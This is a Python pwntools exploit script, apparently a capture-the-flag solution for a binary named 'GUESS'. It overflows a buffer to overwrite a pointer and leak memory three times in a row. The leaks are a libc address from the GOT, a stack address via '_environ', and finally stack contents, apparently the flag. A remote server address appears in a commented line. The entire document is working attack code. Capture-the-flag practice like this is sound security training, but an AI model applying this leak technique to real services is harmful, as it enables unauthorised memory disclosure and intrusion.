#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./GUESS"
context.log_level = "debug"


io = process("./GUESS", env = {"LD_PRELOAD": "./libc.so.6"})
#  io = remote("106.75.90.160", 9999)
elf = ELF("./GUESS")
#  libc = elf.libc
libc = ELF("./libc.so.6")

io.sendlineafter("flag\n", 'a' * 0x128 + p64(elf.got['__libc_start_main']))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['__libc_start_main']
info("libc: {:#x}".format(libc.address))


#  gdb.attach(io, "b *0x400B23\nc")
#  pause()
io.sendlineafter("flag\n", 'a' * 0x128 + p64(libc.sym['_environ']))
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
info("stack: {:#x}".format(stack))

io.sendlineafter("flag\n", 'a' * 0x128 + p64(stack - 0x168))

io.interactive()

